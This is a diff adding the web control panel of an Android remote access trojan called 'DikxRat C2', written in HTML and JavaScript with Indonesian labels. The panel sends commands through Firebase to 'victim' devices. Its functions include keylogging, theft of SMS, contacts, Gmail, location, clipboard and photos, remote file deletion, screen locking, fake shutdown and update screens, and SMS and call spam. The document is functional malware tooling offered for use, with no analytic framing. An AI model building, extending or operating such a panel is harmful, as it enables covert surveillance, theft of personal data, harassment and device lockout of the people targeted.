@@ -1,0 +1,347 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no, viewport-fit=cover">
+    <title>DikxRat C2 - Command Center</title>
+    <script src="https://www.gstatic.com/firebasejs/9.0.0/firebase-app.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/9.0.0/firebase-database.js"></script>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body {
+            background: #000000;
+            font-family: 'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
+            padding-bottom: 20px;
+            color: #fff;
+        }
+        .header {
+            background: rgba(0, 0, 0, 0.95);
+            backdrop-filter: blur(15px);
+            padding: 12px 16px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            border-bottom: 1px solid rgba(255, 51, 51, 0.5);
+            position: sticky;
+            top: 0;
+            z-index: 100;
+        }
+        .back-btn {
+            background: rgba(255, 51, 51, 0.15);
+            border: none;
+            color: #FF3333;
+            width: 36px;
+            height: 36px;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            cursor: pointer;
+        }
+        .victim-info {
+            font-size: 12px;
+            color: #884444;
+            text-align: center;
+            flex: 1;
+        }
+        .victim-name {
+            font-weight: 700;
+            color: #FF3333;
+        }
+        .section-title {
+            padding: 16px 16px 8px 16px;
+            font-size: 14px;
+            font-weight: 700;
+            color: #FF3333;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+            border-left: 3px solid #FF3333;
+            margin-left: 12px;
+        }
+        .grid-container {
+            display: grid;
+            grid-template-columns: repeat(3, 1fr);
+            gap: 8px;
+            padding: 8px 12px;
+        }
+        .feature-btn {
+            background: rgba(20, 20, 20, 0.7);
+            backdrop-filter: blur(5px);
+            border: 1px solid rgba(255, 51, 51, 0.3);
+            border-radius: 20px;
+            padding: 12px 6px;
+            text-align: center;
+            font-size: 11px;
+            font-weight: 600;
+            color: #e0e0e0;
+            transition: all 0.2s;
+            cursor: pointer;
+        }
+        .feature-btn i {
+            display: block;
+            font-size: 20px;
+            margin-bottom: 6px;
+            color: #FF3333;
+        }
+        .feature-btn:active {
+            background: rgba(255, 51, 51, 0.15);
+            transform: scale(0.96);
+        }
+        .feature-btn.danger i { color: #FF6666; }
+        .feature-btn.danger { border-color: rgba(255, 51, 51, 0.5); }
+        
+        /* Modal */
+        .modal {
+            position: fixed;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background: rgba(0, 0, 0, 0.95);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            z-index: 1000;
+            visibility: hidden;
+            opacity: 0;
+            transition: all 0.2s;
+        }
+        .modal.active { visibility: visible; opacity: 1; }
+        .modal-content {
+            background: #1a0a0a;
+            border-radius: 24px;
+            padding: 24px;
+            width: 90%;
+            max-width: 320px;
+            border: 1px solid rgba(255, 51, 51, 0.5);
+        }
+        .modal-content h4 { margin-bottom: 16px; color: #FF3333; }
+        .modal-content input, .modal-content textarea {
+            width: 100%;
+            padding: 12px;
+            margin: 8px 0;
+            background: rgba(0, 0, 0, 0.6);
+            border: 1px solid rgba(255, 51, 51, 0.4);
+            border-radius: 12px;
+            color: #fff;
+        }
+        .modal-buttons { display: flex; gap: 10px; margin-top: 16px; }
+        .modal-buttons button { flex: 1; padding: 12px; border: none; border-radius: 12px; font-weight: 600; cursor: pointer; }
+        .btn-confirm { background: linear-gradient(135deg, #FF3333, #CC0000); color: #fff; }
+        .btn-cancel { background: rgba(255, 51, 51, 0.15); color: #FF6666; border: 1px solid rgba(255, 51, 51, 0.3); }
+        .toast {
+            position: fixed;
+            bottom: 80px;
+            left: 50%;
+            transform: translateX(-50%);
+            background: rgba(0, 0, 0, 0.9);
+            color: #FF3333;
+            padding: 10px 20px;
+            border-radius: 30px;
+            font-size: 12px;
+            z-index: 1000;
+            display: none;
+            border: 1px solid rgba(255, 51, 51, 0.5);
+        }
+    </style>
+</head>
+<body>
+    <div class="header">
+        <div class="back-btn" onclick="goBack()"><i class="fas fa-arrow-left"></i></div>
+        <div class="victim-info" id="victimInfo">Memuat...</div>
+        <div style="width: 36px;"></div>
+    </div>
+
+    <!-- LOCK & OVERLAY -->
+    <div class="section-title">🔒 LOCK & OVERLAY</div>
+    <div class="grid-container">
+        <div class="feature-btn" onclick="sendCommand('lock_screen')"><i class="fas fa-lock"></i>Kunci HP</div>
+        <div class="feature-btn" onclick="sendCommand('unlock_screen')"><i class="fas fa-unlock-alt"></i>Unlock HP</div>
+        <div class="feature-btn" onclick="sendCommand('block_device')"><i class="fas fa-ban"></i>Block HP</div>
+        <div class="feature-btn" onclick="sendCommand('unblock_device')"><i class="fas fa-check-circle"></i>Unblock HP</div>
+        <div class="feature-btn" onclick="sendCommand('fake_shutdown')"><i class="fas fa-power-off"></i>Fake Shutdown</div>
+        <div class="feature-btn" onclick="sendCommand('fake_update')"><i class="fas fa-sync-alt"></i>Fake Update</div>
+        <div class="feature-btn" onclick="showBannerModal()"><i class="fas fa-flag"></i>Banner</div>
+        <div class="feature-btn" onclick="sendCommand('stop_banner')"><i class="fas fa-stop"></i>Stop Banner</div>
+        <div class="feature-btn" onclick="showMediaModal()"><i class="fas fa-play"></i>Play Media</div>
+        <div class="feature-btn" onclick="sendCommand('stop_media')"><i class="fas fa-stop"></i>Stop Media</div>
+        <div class="feature-btn" onclick="showFreezeModal()"><i class="fas fa-snowflake"></i>Freeze App</div>
+        <div class="feature-btn" onclick="sendCommand('disable_buttons')"><i class="fas fa-ban"></i>Disable Tombol</div>
+    </div>
+
+    <!-- KOMUNIKASI & SPAM -->
+    <div class="section-title">💬 KOMUNIKASI & SPAM</div>
+    <div class="grid-container">
+        <div class="feature-btn" onclick="showWAModal()"><i class="fab fa-whatsapp"></i>Kirim WA</div>
+        <div class="feature-btn" onclick="showSMSModal()"><i class="fas fa-envelope"></i>Kirim SMS</div>
+        <div class="feature-btn" onclick="showSpamSMSModal()"><i class="fas fa-envelope-open-text"></i>Spam SMS</div>
+        <div class="feature-btn" onclick="showSpamCallModal()"><i class="fas fa-phone-alt"></i>Spam Call</div>
+        <div class="feature-btn" onclick="sendCommand('stop_spam')"><i class="fas fa-stop"></i>Stop Spam</div>
+        <div class="feature-btn" onclick="showCallModal()"><i class="fas fa-phone"></i>Panggil Nomor</div>
+    </div>
+
+    <!-- SURVEILLANCE -->
+    <div class="section-title">🎥 SURVEILLANCE</div>
+    <div class="grid-container">
+        <div class="feature-btn" onclick="sendCommand('start_keylogger')"><i class="fas fa-keyboard"></i>Keylogger</div>
+        <div class="feature-btn" onclick="sendCommand('app_monitor')"><i class="fas fa-chart-line"></i>App Monitor</div>
+        <div class="feature-btn" onclick="sendCommand('get_gallery')"><i class="fas fa-images"></i>Gallery</div>
+        <div class="feature-btn" onclick="sendCommand('get_signal_log')"><i class="fas fa-signal"></i>Log Sinyal</div>
+        <div class="feature-btn" onclick="showDeleteFileModal()"><i class="fas fa-trash-alt"></i>Hapus File</div>
+    </div>
+
+    <!-- AUDIO & DISPLAY -->
+    <div class="section-title">🎵 AUDIO & DISPLAY</div>
+    <div class="grid-container">
+        <div class="feature-btn" onclick="showBrightnessModal()"><i class="fas fa-sun"></i>Brightness</div>
+        <div class="feature-btn" onclick="showVolumeModal()"><i class="fas fa-volume-up"></i>Volume</div>
+        <div class="feature-btn" onclick="sendCommand('silent_mode')"><i class="fas fa-bell-slash"></i>Silent Mode</div>
+        <div class="feature-btn" onclick="showUrlModal()"><i class="fas fa-globe"></i>Buka Website</div>
+        <div class="feature-btn" onclick="sendCommand('flashlight_on')"><i class="fas fa-lightbulb"></i>Senter</div>
+        <div class="feature-btn" onclick="sendCommand('vibrate')"><i class="fas fa-mobile-alt"></i>Getarkan</div>
+        <div class="feature-btn" onclick="showTextModal()"><i class="fas fa-font"></i>Teks Layar</div>
+        <div class="feature-btn" onclick="showAudioModal()"><i class="fas fa-microphone"></i>Kirim Suara</div>
+        <div class="feature-btn" onclick="showNotifModal()"><i class="fas fa-bell"></i>Kirim Notif</div>
+        <div class="feature-btn" onclick="showWallpaperModal()"><i class="fas fa-image"></i>Wallpaper</div>
+        <div class="feature-btn" onclick="showMusicModal()"><i class="fas fa-music"></i>Putar Musik</div>
+        <div class="feature-btn" onclick="sendCommand('stop_music')"><i class="fas fa-stop"></i>Stop Musik</div>
+        <div class="feature-btn" onclick="showAppModal()"><i class="fas fa-th"></i>Buka Aplikasi</div>
+    </div>
+
+    <!-- EXTRA SURVEILLANCE -->
+    <div class="section-title">📡 EXTRA</div>
+    <div class="grid-container">
+        <div class="feature-btn" onclick="sendCommand('take_photo')"><i class="fas fa-camera"></i>Kamera</div>
+        <div class="feature-btn" onclick="sendCommand('get_sms')"><i class="fas fa-envelope"></i>SMS Baru</div>
+        <div class="feature-btn" onclick="sendCommand('get_old_sms')"><i class="fas fa-history"></i>SMS Lama</div>
+        <div class="feature-btn" onclick="sendCommand('get_contacts')"><i class="fas fa-address-book"></i>Kontak</div>
+        <div class="feature-btn" onclick="sendCommand('get_call_logs')"><i class="fas fa-phone-alt"></i>Panggilan</div>
+        <div class="feature-btn" onclick="sendCommand('get_system_info')"><i class="fas fa-microchip"></i>Sistem</div>
+        <div class="feature-btn" onclick="sendCommand('get_gmail')"><i class="fas fa-envelope"></i>Gmail</div>
+        <div class="feature-btn" onclick="sendCommand('get_location')"><i class="fas fa-map-marker-alt"></i>Lokasi</div>
+        <div class="feature-btn" onclick="sendCommand('get_network')"><i class="fas fa-wifi"></i>Jaringan</div>
+        <div class="feature-btn" onclick="sendCommand('get_notifications')"><i class="fas fa-bell"></i>Notifikasi</div>
+        <div class="feature-btn" onclick="sendCommand('get_clipboard')"><i class="fas fa-clipboard"></i>Clipboard</div>
+        <div class="feature-btn" onclick="sendCommand('get_apps')"><i class="fas fa-th-large"></i>Aplikasi</div>
+        <div class="feature-btn" onclick="sendCommand('get_payload')"><i class="fas fa-code"></i>Payload</div>
+        <div class="feature-btn" onclick="sendCommand('get_call_tower')"><i class="fas fa-tower-cell"></i>Call Tower</div>
+        <div class="feature-btn" onclick="sendCommand('wifi_scan')"><i class="fas fa-wifi"></i>WiFi Scan</div>
+        <div class="feature-btn" onclick="sendCommand('wifi_history')"><i class="fas fa-history"></i>WiFi History</div>
+        <div class="feature-btn" onclick="sendCommand('file_manager')"><i class="fas fa-folder"></i>File Manager</div>
+    </div>
+
+    <!-- MODALS -->
+    <div id="bannerModal" class="modal"><div class="modal-content"><h4>📢 Banner Message</h4><input type="text" id="bannerText" placeholder="Pesan banner"><div class="modal-buttons"><button class="btn-confirm" onclick="sendCommandWithParam('show_banner', document.getElementById('bannerText').value)">SEND</button><button class="btn-cancel" onclick="closeModal('bannerModal')">Cancel</button></div></div></div>
+    <div id="mediaModal" class="modal"><div class="modal-content"><h4>▶️ Play Media</h4><input type="text" id="mediaUrl" placeholder="URL media (mp3/mp4)"><div class="modal-buttons"><button class="btn-confirm" onclick="sendCommandWithParam('play_media', document.getElementById('mediaUrl').value)">PLAY</button><button class="btn-cancel" onclick="closeModal('mediaModal')">Cancel</button></div></div></div>
+    <div id="freezeModal" class="modal"><div class="modal-content"><h4>❄️ Freeze App</h4><input type="text" id="freezePackage" placeholder="Package name (com.example.app)"><div class="modal-buttons"><button class="btn-confirm" onclick="sendCommandWithParam('freeze_app', document.getElementById('freezePackage').value)">FREEZE</button><button class="btn-cancel" onclick="closeModal('freezeModal')">Cancel</button></div></div></div>
+    <div id="waModal" class="modal"><div class="modal-content"><h4>💬 Kirim WA</h4><input type="text" id="waNumber" placeholder="Nomor tujuan"><textarea id="waMessage" rows="3" placeholder="Pesan"></textarea><div class="modal-buttons"><button class="btn-confirm" onclick="sendCommandWithParams('send_wa', {number:document.getElementById('waNumber').value, text:document.getElementById('waMessage').value})">SEND</button><button class="btn-cancel" onclick="closeModal('waModal')">Cancel</button></div></div></div>
+    <div id="smsModal" class="modal"><div class="modal-content"><h4>✉️ Kirim SMS</h4><input type="text" id="smsNumber" placeholder="Nomor tujuan"><textarea id="smsMessage" rows="3" placeholder="Pesan"></textarea><div class="modal-buttons"><button class="btn-confirm" onclick="sendCommandWithParams('send_sms', {number:document.getElementById('smsNumber').value, text:document.getElementById('smsMessage').value})">SEND</button><button class="btn-cancel" onclick="closeModal('smsModal')">Cancel</button></div></div></div>
+    <div id="spamSMSModal" class="modal"><div class="modal-content"><h4>📨 Spam SMS</h4><input type="text" id="spamNumber" placeholder="Nomor tujuan"><input type="number" id="spamCount" placeholder="Jumlah spam"><textarea id="spamMessage" rows="2" placeholder="Pesan"></textarea><div class="modal-buttons"><button class="btn-confirm" onclick="sendCommandWithParams('spam_sms', {number:document.getElementById('spamNumber').value, count:document.getElementById('spamCount').value, text:document.getElementById('spamMessage').value})">START</button><button class="btn-cancel" onclick="closeModal('spamSMSModal')">Cancel</button></div></div></div>
+    <div id="spamCallModal" class="modal"><div class="modal-content"><h4>📞 Spam Call</h4><input type="text" id="callNumber" placeholder="Nomor tujuan"><div class="modal-buttons"><button class="btn-confirm" onclick="sendCommandWithParam('spam_call', document.getElementById('callNumber').value)">START</button><button class="btn-cancel" onclick="closeModal('spamCallModal')">Cancel</button></div></div></div>
+    <div id="callModal" class="modal"><div class="modal-content"><h4>📱 Panggil Nomor</h4><input type="text" id="callNowNumber" placeholder="Nomor tujuan"><div class="modal-buttons"><button class="btn-confirm" onclick="sendCommandWithParam('make_call', document.getElementById('callNowNumber').value)">CALL</button><button class="btn-cancel" onclick="closeModal('callModal')">Cancel</button></div></div></div>
+    <div id="deleteFileModal" class="modal"><div class="modal-content"><h4>🗑️ Hapus File</h4><input type="text" id="filePath" placeholder="/storage/emulated/0/file.txt"><div class="modal-buttons"><button class="btn-confirm" onclick="sendCommandWithParam('delete_file', document.getElementById('filePath').value)">DELETE</button><button class="btn-cancel" onclick="closeModal('deleteFileModal')">Cancel</button></div></div></div>
+    <div id="brightnessModal" class="modal"><div class="modal-content"><h4>☀️ Brightness</h4><input type="range" id="brightnessLevel" min="0" max="255" value="128"><div class="modal-buttons"><button class="btn-confirm" onclick="sendCommandWithParam('set_brightness', document.getElementById('brightnessLevel').value)">SET</button><button class="btn-cancel" onclick="closeModal('brightnessModal')">Cancel</button></div></div></div>
+    <div id="volumeModal" class="modal"><div class="modal-content"><h4>🔊 Volume</h4><input type="range" id="volumeLevel" min="0" max="100" value="50"><div class="modal-buttons"><button class="btn-confirm" onclick="sendCommandWithParam('set_volume', document.getElementById('volumeLevel').value)">SET</button><button class="btn-cancel" onclick="closeModal('volumeModal')">Cancel</button></div></div></div>
+    <div id="urlModal" class="modal"><div class="modal-content"><h4>🌐 Buka Website</h4><input type="text" id="urlInput" placeholder="https://example.com"><div class="modal-buttons"><button class="btn-confirm" onclick="sendCommandWithParam('open_url', document.getElementById('urlInput').value)">OPEN</button><button class="btn-cancel" onclick="closeModal('urlModal')">Cancel</button></div></div></div>
+    <div id="textModal" class="modal"><div class="modal-content"><h4>📝 Teks Layar</h4><textarea id="overlayText" rows="3" placeholder="Pesan yang tampil di layar"></textarea><div class="modal-buttons"><button class="btn-confirm" onclick="sendCommandWithParam('show_text', document.getElementById('overlayText').value)">SHOW</button><button class="btn-cancel" onclick="closeModal('textModal')">Cancel</button></div></div></div>
+    <div id="audioModal" class="modal"><div class="modal-content"><h4>🎙️ Kirim Suara</h4><input type="text" id="audioUrl" placeholder="URL suara (mp3)"><div class="modal-buttons"><button class="btn-confirm" onclick="sendCommandWithParam('play_audio', document.getElementById('audioUrl').value)">PLAY</button><button class="btn-cancel" onclick="closeModal('audioModal')">Cancel</button></div></div></div>
+    <div id="notifModal" class="modal"><div class="modal-content"><h4>🔔 Kirim Notif</h4><input type="text" id="notifTitle" placeholder="Title"><textarea id="notifBody" rows="2" placeholder="Body"></textarea><div class="modal-buttons"><button class="btn-confirm" onclick="sendCommandWithParams('send_notification', {title:document.getElementById('notifTitle').value, body:document.getElementById('notifBody').value})">SEND</button><button class="btn-cancel" onclick="closeModal('notifModal')">Cancel</button></div></div></div>
+    <div id="wallpaperModal" class="modal"><div class="modal-content"><h4>🖼️ Wallpaper</h4><input type="text" id="wallpaperUrl" placeholder="URL gambar"><div class="modal-buttons"><button class="btn-confirm" onclick="sendCommandWithParam('set_wallpaper', document.getElementById('wallpaperUrl').value)">SET</button><button class="btn-cancel" onclick="closeModal('wallpaperModal')">Cancel</button></div></div></div>
+    <div id="musicModal" class="modal"><div class="modal-content"><h4>🎵 Putar Musik</h4><input type="text" id="musicUrl" placeholder="URL musik (mp3)"><div class="modal-buttons"><button class="btn-confirm" onclick="sendCommandWithParam('play_music', document.getElementById('musicUrl').value)">PLAY</button><button class="btn-cancel" onclick="closeModal('musicModal')">Cancel</button></div></div></div>
+    <div id="appModal" class="modal"><div class="modal-content"><h4>📲 Buka Aplikasi</h4><input type="text" id="appPackage" placeholder="Package name (com.example.app)"><div class="modal-buttons"><button class="btn-confirm" onclick="sendCommandWithParam('open_app', document.getElementById('appPackage').value)">OPEN</button><button class="btn-cancel" onclick="closeModal('appModal')">Cancel</button></div></div></div>
+
+    <div id="toast" class="toast"></div>
+
+    <script>
+        const firebaseConfig = {
+            apiKey: "AIzaSyD-XXXXXXXXXXXXXXXXXXXXXXXXX",
+            authDomain: "dikxrat.firebaseapp.com",
+            databaseURL: "https://dikxrat-default-rtdb.asia-southeast1.firebasedatabase.app",
+            projectId: "dikxrat",
+            storageBucket: "dikxrat.appspot.com",
+            appId: "1:613800760096:android:4b52f441eda4d620"
+        };
+
+        firebase.initializeApp(firebaseConfig);
+        const db = firebase.database();
+
+        let currentUser = null;
+        let currentVictimId = null;
+        let victimName = 'Unknown';
+
+        function showToast(msg) {
+            const toast = document.getElementById('toast');
+            toast.textContent = msg;
+            toast.style.display = 'block';
+            setTimeout(() => { toast.style.display = 'none'; }, 2000);
+        }
+
+        function loadUser() {
+            const userStr = localStorage.getItem('currentUser');
+            if (!userStr) { window.location.href = 'index.html'; return false; }
+            currentUser = JSON.parse(userStr);
+            return true;
+        }
+
+        function loadVictim() {
+            currentVictimId = localStorage.getItem('selectedVictimId');
+            if (!currentVictimId) { window.location.href = 'dashboard.html'; return; }
+            
+            const victimsRef = db.ref(`users/${currentUser.userId}/accounts/${currentUser.accountId}/victims/${currentVictimId}`);
+            victimsRef.once('value', (snapshot) => {
+                const data = snapshot.val() || {};
+                victimName = data.device_name || data.model || currentVictimId.substring(0, 8);
+                document.getElementById('victimInfo').innerHTML = `<span class="victim-name">📱 ${victimName}</span>`;
+            });
+        }
+
+        function sendCommand(command) {
+            if (!currentVictimId) { showToast('❌ Victim tidak ditemukan'); return; }
+            db.ref(`victims/${currentVictimId}/commands/${command}`).set({ timestamp: Date.now() });
+            showToast(`✅ Command "${command}" sent!`);
+        }
+
+        function sendCommandWithParam(command, param) {
+            if (!currentVictimId) { showToast('❌ Victim tidak ditemukan'); return; }
+            db.ref(`victims/${currentVictimId}/commands/${command}`).set({ value: param, timestamp: Date.now() });
+            showToast(`✅ Command "${command}" sent!`);
+            closeAllModals();
+        }
+
+        function sendCommandWithParams(command, params) {
+            if (!currentVictimId) { showToast('❌ Victim tidak ditemukan'); return; }
+            db.ref(`victims/${currentVictimId}/commands/${command}`).set({ ...params, timestamp: Date.now() });
+            showToast(`✅ Command "${command}" sent!`);
+            closeAllModals();
+        }
+
+        function goBack() { window.location.href = 'dashboard.html'; }
+
+        function closeAllModals() { document.querySelectorAll('.modal').forEach(m => m.classList.remove('active')); }
+        function showModal(id) { closeAllModals(); document.getElementById(id).classList.add('active'); }
+        function closeModal(id) { document.getElementById(id).classList.remove('active'); }
+
+        function showBannerModal() { showModal('bannerModal'); }
+        function showMediaModal() { showModal('mediaModal'); }
+        function showFreezeModal() { showModal('freezeModal'); }
+        function showWAModal() { showModal('waModal'); }
+        function showSMSModal() { showModal('smsModal'); }
+        function showSpamSMSModal() { showModal('spamSMSModal'); }
+        function showSpamCallModal() { showModal('spamCallModal'); }
+        function showCallModal() { showModal('callModal'); }
+        function showDeleteFileModal() { showModal('deleteFileModal'); }
+        function showBrightnessModal() { showModal('brightnessModal'); }
+        function showVolumeModal() { showModal('volumeModal'); }
+        function showUrlModal() { showModal('urlModal'); }
+        function showTextModal() { showModal('textModal'); }
+        function showAudioModal() { showModal('audioModal'); }
+        function showNotifModal() { showModal('notifModal'); }
+        function showWallpaperModal() { showModal('wallpaperModal'); }
+        function showMusicModal() { showModal('musicModal'); }
+        function showAppModal() { showModal('appModal'); }
+
+        if (loadUser()) { loadVictim(); }
+    </script>
+</body>
+</html>
